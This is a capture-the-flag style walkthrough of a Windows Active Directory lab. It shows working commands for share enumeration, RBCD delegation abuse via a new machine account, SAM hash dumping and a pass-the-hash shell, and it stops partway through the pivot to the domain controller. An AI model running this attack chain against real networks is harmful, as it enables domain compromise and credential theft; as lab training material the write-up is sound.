---
layout: post
title: NorthBridge Systems
date: 2026-01-15 13:00:00 +0100
categories: [Walkthroughs]
tags: [HackSmarter, Windows, Pivoting, RDP, AD-DACL, DPAPI, DCSync Privesc]
---
![alt text](https://images.coursestack.com/1e19584b-4577-402d-a264-d6476d2d1b9b/c8a3a1bf-32c7-4e3d-ad92-faed661c337e)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | HackSmarter       |
| OS | Windows        |
| Difficulty | Hard        |
| Release Date | 20/11/2025       |
| Link to machine | [NorthBridge Systems](https://app.hackthebox.com/machines/Arctic?tab=play_machine)        |

# Highlights
HackSmarter, Windows, Pivoting, RDP, AD-DACL, DPAPI, DCSync Privesc

# Disclosure
Objective / Scope
NorthBridge Systems is a managed service provider that has engaged the Hack Smarter Red Team to perform a security assessment against a portion of their environment. The assessment is to be conducted from an assumed breach perspective, as you have been provided credentials for a dedicated service account created specifically for this engagement.
Your point of contact at NorthBridge Systems has authorized testing on the following hosts. Any host outside this scope is considered out of scope and should not be accessed.

```NORTHDC01 (Domain controller)```

```NORTHJMP01 (Jump box user by the IT team)```

The primary objective of the security assessment is to compromise the domain controller (NORTHDC01) in order to demonstrate the effectiveness (or lack thereof) of the recent security hardening activities.
To track your progress in the assessment, there are flags located at ```C:\Users\Administrator\Desktop``` on each host.
As you progress through the environment, make sure to document these flags so your point of contact knows you have compromised the environment.
Your success in this assessment will directly inform their future cybersecurity budget! No pressure!

Starting Credentials

```bash
_securitytestingsvc:4kCc$A@NZvNAdK@
```

We are being given not only the IPs of the 2 machines, but also the host names, so let's add ```NORTHDC01```and ```NORTHJMP01``` to our ```/etc/hosts``` file.

# Testing credentials with SMB enumeration
Since we have credentials provided we can test then on both targets by saving either the hostname or IPs in a txt file and use ```nxc``` to enumerate the shares and read/write if applicable.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --shares
SMB         10.1.9.134      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         10.1.151.59     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         10.1.9.134      445    NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@ 
SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@ 
SMB         10.1.9.134      445    NORTHJMP01       [*] Enumerated shares
SMB         10.1.9.134      445    NORTHJMP01       Share           Permissions     Remark
SMB         10.1.9.134      445    NORTHJMP01       -----           -----------     ------
SMB         10.1.9.134      445    NORTHJMP01       ADMIN$                          Remote Admin
SMB         10.1.9.134      445    NORTHJMP01       C$                              Default share
SMB         10.1.9.134      445    NORTHJMP01       IPC$            READ            Remote IPC
SMB         10.1.9.134      445    NORTHJMP01       Network Shares  READ            
SMB         10.1.151.59     445    NORTHDC01        [*] Enumerated shares
SMB         10.1.151.59     445    NORTHDC01        Share           Permissions     Remark
SMB         10.1.151.59     445    NORTHDC01        -----           -----------     ------
SMB         10.1.151.59     445    NORTHDC01        ADMIN$                          Remote Admin
SMB         10.1.151.59     445    NORTHDC01        C$                              Default share
SMB         10.1.151.59     445    NORTHDC01        IPC$            READ            Remote IPC
SMB         10.1.151.59     445    NORTHDC01        NETLOGON        READ            Logon server share 
SMB         10.1.151.59     445    NORTHDC01        SYSVOL          READ            Logon server share 
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```
Interestingly, the given credentials can access both machines. We could hunt for GPP passwords in the SYSVOL of the domain controller, but the ```Network Shares``` on the host ```NORTHJMP01``` looks promising and we also gather the domain name so that can be added to the ```/etc/hosts```file just in case we need to perform ```kerberos``` attacks.
For good mesure, lets run an ```nmap``` scan for both hosts, looking for unusual ports or easy wins. 

# Nmap NORTHDC01
```bash
──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nmap -T4 -A -p- -Pn NORTHDC01.northbridge.corp
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 20:20 GMT
Nmap scan report for NORTHDC01.northbridge.corp (10.1.151.59)
Host is up (0.11s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 20:31:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Not valid before: 2025-09-21T02:43:23
|_Not valid after:  2026-09-21T02:43:23
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Not valid before: 2025-09-21T02:43:23
|_Not valid after:  2026-09-21T02:43:23
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Not valid before: 2025-09-21T02:43:23
|_Not valid after:  2026-09-21T02:43:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Not valid before: 2025-09-21T02:43:23
|_Not valid after:  2026-09-21T02:43:23
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHDC01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHDC01.northbridge.corp
|   DNS_Tree_Name: northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-02T20:32:52+00:00
|_ssl-date: 2026-01-02T20:33:31+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Not valid before: 2025-09-20T01:35:18
|_Not valid after:  2026-03-22T01:35:18
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
61421/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61434/tcp open  msrpc         Microsoft Windows RPC
61457/tcp open  msrpc         Microsoft Windows RPC
61488/tcp open  msrpc         Microsoft Windows RPC
61555/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: NORTHDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-02T20:32:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   108.88 ms 10.200.0.1
2   ...
3   110.11 ms NORTHDC01.northbridge.corp (10.1.151.59)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 808.89 seconds

```

# Nmap NORTHJMP01
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nmap -T4 -A -p- -Pn NORTHJMP01.northbridge.corp
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 21:57 GMT
Stats: 0:15:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.12% done; ETC: 22:13 (0:00:18 remaining)
Stats: 0:16:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for NORTHJMP01.northbridge.corp (10.1.9.134)
Host is up (0.11s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHJMP01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHJMP01.northbridge.corp
|   DNS_Tree_Name: northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-07T22:15:11+00:00
| ssl-cert: Subject: commonName=NORTHJMP01.northbridge.corp
| Not valid before: 2025-09-20T02:38:29
|_Not valid after:  2026-03-22T02:38:29
|_ssl-date: 2026-01-07T22:15:50+00:00; +4s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-07T22:15:14
|_  start_date: N/A
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.71 ms 10.200.0.1
2   ...
3   113.78 ms NORTHJMP01.northbridge.corp (10.1.9.134)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1088.51 seconds
```

Both machines have port ```3389``` open, which is not unsual for windows servers, but not always present in CTFs.

# Hunting interesting files
Going back to the ```Network Share``` found on ```NORTHJMP01```, we can enumerate the files using the once more ```nxc``` and spider_plus module 
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHJMP01 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' -M spider_plus
```
We find numerous files, not all of them are interesting but we find some that reveal a bit more about the domain configuration
```sam scratchpad.txt``` & ```Password reset instructions.txt``` containing a plain test password.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ cat sam\ scratchpad.txt 
- Domain object DACLs
-- Review vulnerable control rights like DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
-- Identify excessive rights like ForceChangePassword and GenericAll

- Begin project planning for identifying hardcoded secrets in scripts (can we automate this?).
-- What can we do instead of using hardcoded passwords but make them secure?

- Review migrating privileged accounts to MSAs
-- How do we integrate MSAs with the task scheduler?
-- Any limitations or prep work needed?

- Implementing AD best practices
-- Set MAQ from 10 to 0
-- Disabling print spooler on NORTHDC01
-- Enforce the use of separate admin accounts vaulted via our PAM solution
-- Remove local admin rights from daily-use accounts (group-based permissions instead)
-- SMB signing: What are the impacts if we enable it?
-- Limit usage of built-in groups (Backup Operators, Account Operators)
-- Run PingCastle to track progress

- Protected Users vs. "Account is sensitive" for privileged accounts
-- What are the differences? What accounts should be left out? Break glass?
-- Need to test before large-scale rollout.

- ADCS hardening
-- Review published templates for common escalation vectors
-- https://posts.specterops.io/certified-pre-owned-d95910965cd2 

┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ cat Password\ reset\ instructions.txt 
Northbridge Systems – Password Reset Script
-------------------------------------------

1. Open PowerShell as a domain user with reset privileges.

2. Run the following command to reset the user's password:

   Set-ADAccountPassword -Identity "username" -NewPassword (ConvertTo-SecureString "ChangeMe@Northbridge!!" -AsPlainText -Force)

3. OPTIONAL: If the user should change their password at next login:

   Set-ADUser -Identity "username" -ChangePasswordAtLogon $true

4. OPTIONAL: If the account is locked out, unlock it:

   Unlock-ADAccount -Identity "username"

5. Confirm with the user that they can log in successfully.

Note:
- Replace "username" with the user's actual AD username.
- Replace "NewP@ssword123" with the temporary password (follow policy).
- Ensure the password meets domain complexity requirements.
```

# Users Enumeration
Since we have ```ldap``` open on the domain controller and a valid user we can enumerate all valid users, and hopefully a clue or a plaintext password in their description.
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc ldap NORTHDC01 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --active-users
LDAP        10.1.151.59     389    NORTHDC01        [*] Windows Server 2022 Build 20348 (name:NORTHDC01) (domain:northbridge.corp)
LDAP        10.1.151.59     389    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@ 
LDAP        10.1.151.59     389    NORTHDC01        [*] Total records returned: 25, total 2 user(s) disabled
LDAP        10.1.151.59     389    NORTHDC01        -Username-                    -Last PW Set-       -BadPW-  -Description-                      
LDAP        10.1.151.59     389    NORTHDC01        Administrator                 2025-11-12 21:50:09 1        Built-in account for administering the computer/domain                                                                                                                               
LDAP        10.1.151.59     389    NORTHDC01        cfullerT2                     2025-09-21 02:45:44 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        csmithT2                      2025-09-21 02:46:39 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        erhodesT0                     2025-09-21 02:47:09 0        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        gcookT1                       2025-09-21 02:47:39 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        mleeT1                        2025-09-21 02:48:09 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        rhallT1                       2025-09-21 02:48:37 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        smccormickT1                  2025-09-21 02:49:09 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        vmitchellT2                   2025-09-21 02:49:37 2        DO NOT CHANGE PASSWORD -- MANAGED BY PAM                                                                                                                                             
LDAP        10.1.151.59     389    NORTHDC01        jgoodman                      2025-09-21 02:51:09 2        
LDAP        10.1.151.59     389    NORTHDC01        mlee                          2025-09-21 02:51:54 2        
LDAP        10.1.151.59     389    NORTHDC01        smccormick                    2025-09-21 02:52:40 2        
LDAP        10.1.151.59     389    NORTHDC01        bsandersen                    2025-09-21 02:53:32 2        
LDAP        10.1.151.59     389    NORTHDC01        cfuller                       2025-09-21 02:54:04 2        
LDAP        10.1.151.59     389    NORTHDC01        csmith                        2025-09-21 02:54:33 2        
LDAP        10.1.151.59     389    NORTHDC01        vmitchell                     2025-09-21 02:55:11 2        
LDAP        10.1.151.59     389    NORTHDC01        awilliams                     2025-09-21 02:57:14 2        
LDAP        10.1.151.59     389    NORTHDC01        erhodes                       2025-09-21 02:57:44 2        
LDAP        10.1.151.59     389    NORTHDC01        gcook                         2025-09-21 02:58:11 2        
LDAP        10.1.151.59     389    NORTHDC01        rhall                         2025-09-21 02:58:37 2        
LDAP        10.1.151.59     389    NORTHDC01        _backupsvc                    2025-09-21 03:00:44 0        
LDAP        10.1.151.59     389    NORTHDC01        _securitytestingsvc           2025-09-21 03:01:19 0        2025 - Used to support third-party security assessments. Owner, Samantha McCormick                                                                                                   
LDAP        10.1.151.59     389    NORTHDC01        _svrautomationsvc             2025-09-21 03:01:45 0   

```
Unfortunatelly, most of the existing users seem to have a PAM system managing their password.
```PAM``` is and identity security solution that protects organizations from cyberthreats by monitoring and preventing unauthorized acces to critical resources. The worst part is the fact that these systems usually rotate passwords very frequently, so bad news for us!

# Interesting files in the NETLOGON share of NORTHDC01
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb 10.1.151.59 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' -M spider_plus
SMB         10.1.151.59     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@ 
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*]     STATS_FLAG: True
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*]  OUTPUT_FOLDER: /home/Kyd0s/.nxc/modules/nxc_spider_plus
SMB         10.1.151.59     445    NORTHDC01        [*] Enumerated shares
SMB         10.1.151.59     445    NORTHDC01        Share           Permissions     Remark
SMB         10.1.151.59     445    NORTHDC01        -----           -----------     ------
SMB         10.1.151.59     445    NORTHDC01        ADMIN$                          Remote Admin
SMB         10.1.151.59     445    NORTHDC01        C$                              Default share
SMB         10.1.151.59     445    NORTHDC01        IPC$            READ            Remote IPC
SMB         10.1.151.59     445    NORTHDC01        NETLOGON        READ            Logon server share 
SMB         10.1.151.59     445    NORTHDC01        SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [+] Saved share-file metadata to "/home/Kyd0s/.nxc/modules/nxc_spider_plus/10.1.151.59.json".
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] Total folders found:  35
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] Total files found:    20
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] File size average:    482.51 KB
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] File size min:        22 B
SPIDER_PLUS 10.1.151.59     445    NORTHDC01        [*] File size max:        2.65 MB
                                                                                                                            
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ cat /home/Kyd0s/.nxc/modules/nxc_spider_plus/10.1.151.59.json
{
    "NETLOGON": {
        "Bginfo/Bginfo64.exe": {
            "atime_epoch": "2025-09-21 04:08:28",
            "ctime_epoch": "2025-09-21 04:08:28",
            "mtime_epoch": "2025-09-22 03:07:15",
            "size": "2.65 MB"
        },
        "Bginfo/Northbridge-BGInfo.bgi": {
            "atime_epoch": "2025-09-22 23:42:00",
            "ctime_epoch": "2025-09-21 04:08:28",
            "mtime_epoch": "2025-09-22 23:42:00",
            "size": "1.98 MB"
        },
        "Bginfo/Northbridge-Logo.jpg": {
            "atime_epoch": "2025-09-21 04:08:28",
            "ctime_epoch": "2025-09-21 04:08:28",
            "mtime_epoch": "2025-09-22 03:07:15",
            "size": "79.15 KB"
        },
        "Bginfo/bginfo-deploy.bat": {
            "atime_epoch": "2025-09-21 04:27:29",
            "ctime_epoch": "2025-09-21 04:08:28",
            "mtime_epoch": "2025-09-22 03:07:15",
            "size": "167 B"
        }
```
Nothing we can use, the ```bginfo-deploy.bat``` could have been exploitable if we had R/W access to the share, but that's not the case.
```Bginfo``` is a sysinternals tools used to display information about the host on the desktop, more information can be found on Microsoft Learn's [Bginfo](https://learn.microsoft.com/en-us/sysinternals/downloads/bginfo) page.

# Foothold on NORTHJMP01 via RDP
We can try using the credentials we have to see if we can RDP to any of the machines, and we confirm that we can login to ```NORTHJMP01```.
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ xfreerdp3 /u:'_securitytestingsvc' /p:'4kCc$A@NZvNAdK@' /v:10.1.9.134 /cert:ignore
```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge1.png?raw=true)

In the C drive, we find interesting folders containing scripts 
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge2.png?raw=true)and the file ```C:\Scripts\Server Build Automation\Readme.txt``` contains a plain text password of a new user ```_svrautomationsvc```. This service account is being used to create and join computers to the domain, so must have some permissions we could exploit.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge3.png?raw=true)
Additionally in the file ```C:\Scripts\Server Build Automation\ServerBuildAutomation\ServerBuildAutomation.ps1``` we find a local administrator username and password, which are not useful as the account mentioned does not exist on the current machine, but the same script discloses the OU used for the creation of the new machines, we take note of this information to see if it can be used later.
```bash
# Define the full distinguished name of the provisioning OU
$OUPath = "OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp"
```

# Bloodhound enumeration
With this new information, including the new user and password, we launch bloodhound to see what this new user can do

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ bloodhound-python -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' -d northbridge.corp -ns 10.1.151.59 -c All --zip
```
We can mark the users ```_svrautomationsvc``` and ```_securitytestingsvc``` as owned, and check the ``` Outbound Object control``` for the _svrautomationsvc account, which has ```WriteAccountRestrictions```over ```NORTHJMP01.northbridge.corp```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge4.png?raw=true)
This looks like the classic ```RCBD``` attack, in which the user with control over a machine can create a new machine, set the ```msDS-AllowedToActOnBehalfOfOtherIdentity``` attribute to include the new machine. This allows the newly create machine to impersonate any user to the resources associated with the account, but we find that the ```MachineAccountQuota``` for this user is 0.
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc ldap NORTHDC01 -u '_svrautomationsvc' -p '*************' -M maq
LDAP        10.1.151.59     389    NORTHDC01        [*] Windows Server 2022 Build 20348 (name:NORTHDC01) (domain:northbridge.corp)
LDAP        10.1.151.59     389    NORTHDC01        [+] northbridge.corp\_svrautomationsvc:************* 
MAQ         10.1.151.59     389    NORTHDC01        [*] Getting the MachineAccountQuota
MAQ         10.1.151.59     389    NORTHDC01        MachineAccountQuota: 0
```

Going back to the automation script, we know that this account should be able to create and join machines when using a specific OU, so we give it a go, and it works.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ bloodyAD --host NORTHDC01 -d northbridge.corp -u _svrautomationsvc -p '************' add computer --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' 'Kyd0sPC' 'H@ck3d123!'
[+] Kyd0sPC$ created
```

```bash
──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ rbcd.py -delegate-from 'Kyd0sPC$' -delegate-to 'NORTHJMP01$' -action 'write' 'northbridge.corp/_svrautomationsvc:************' -dc-ip 10.1.151.59
/home/Kyd0s/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] Kyd0sPC$ can now impersonate users on NORTHJMP01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     Kyd0sPC$     (S-1-5-21-1010595023-1608570688-3264491749-3601)
From here, we can proceed following the suggest of bloodhound, with the classic ```RBCD``` attack.
After trying to target the users ```ERHODEST0```, which has admin rights on this machine, we see that is in a protected group so cannot be targeted with this attack, we look for other users that can be targeted based on the user enumeration we did earlier.
We find 4 users part of a group called ```NORTHJMP01PRIV``` with the description ```Used to grant local administrator access to NORTHJMP01``` so we can target any of them.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge5.png?raw=true)

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ getST.py -spn 'cifs/NORTHJMP01.northbridge.corp' -impersonate 'GCOOKT1' 'northbridge.corp/Kyd0sPC$:H@ck3d123!' -dc-ip 10.1.151.59
/home/Kyd0s/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating GCOOKT1
[*] Requesting S4U2Proxy
[*] Saving ticket in GCOOKT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
```
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ export KR5CCNAME=GCOOKT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
```

We modify our ```krb5.conf``` file
```bash
[libdefaults]
  default_realm = NORTHBRIDGE.CORP
  dns_lookup_kdc = false
  dns_lookup_realm = false
  rdns = false
  udp_preference_limit = 1
  ticket_lifetime = 24h
  forwardable = true

[realms]
  NORTHBRIDGE.CORP = {
    kdc = 10.1.151.59
    admin_server = 10.1.151.59
  }

[domain_realm]
  .northbridge.corp = NORTHBRIDGE.CORP
  northbridge.corp = NORTHBRIDGE.CORP
```

And confirm we have pwned the host
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHJMP01 -u 'GCOOKT1' -k --use-kcache --shares
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
```

We dump the SAM hash and collect the flag using Evil-WinRM and 

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHJMP01 -u 'GCOOKT1' -k --use-kcache --sam                                                   
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         NORTHJMP01      445    NORTHJMP01       [*] Dumping SAM hashes
SMB         NORTHJMP01      445    NORTHJMP01       Administrator:500:aad3b435b51404eeaad3b435b51404ee:*******************:::                                                                                                              
SMB         NORTHJMP01      445    NORTHJMP01       Guest:501:aad3b435b51404eeaad3b435b51404ee:*******************:::                                                                                                                      
SMB         NORTHJMP01      445    NORTHJMP01       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:*******************:::                                                                                                             
SMB         NORTHJMP01      445    NORTHJMP01       WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d*******************:::                                                                                                         
SMB         NORTHJMP01      445    NORTHJMP01       [+] Added 4 SAM hashes to the database

┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ evil-winrm -i NORTHJMP01 -u Administrator -H '*******************' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\user.txt

```



# Owning the Domain
We need to pivot to ```NORTHDC01```, and from our bloodhound enumeration, we know that ```_backupsvc``` has the ```Backup Operator``` group, perfect for privilege escalation and compromising a domain.
In the ```NORTHJMP01``` host, there is an ecrypted password txt file

